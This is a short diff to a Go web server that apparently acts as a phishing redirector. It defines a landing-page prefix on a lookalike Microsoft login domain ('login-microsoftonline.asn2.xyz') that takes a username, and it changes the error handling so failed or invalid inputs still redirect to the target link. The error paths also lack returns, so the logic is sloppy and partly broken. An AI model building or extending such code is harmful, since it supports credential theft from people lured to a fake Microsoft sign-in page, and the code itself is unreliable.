@@ -15,7 +15,7 @@ func main() {
 	r.Use(middleware.Logger)
 
 	var (
-		redirectErrorLink = "https://google.com/" //ERROR LINK
+		redirectErrorLink = "https://google.com" //ERROR LINK
 		prefixLandingPage = "https://login-microsoftonline.asn2.xyz/?username="
 	)
 
@@ -26,11 +26,11 @@ func main() {
 		//fmt.Printf("%q\n", err, string(data))
 
 		if err != nil {
-			http.Redirect(w, r, redirectErrorLink, http.StatusMovedPermanently)
+			http.Redirect(w, r, targetLink, http.StatusMovedPermanently)
 		}
 
 		if !IsUrl(targetLink) {
-			http.Redirect(w, r, redirectErrorLink, http.StatusMovedPermanently)
+			http.Redirect(w, r, targetLink, http.StatusMovedPermanently)
 		}
 
 		http.Redirect(w, r, targetLink, http.StatusMovedPermanently)
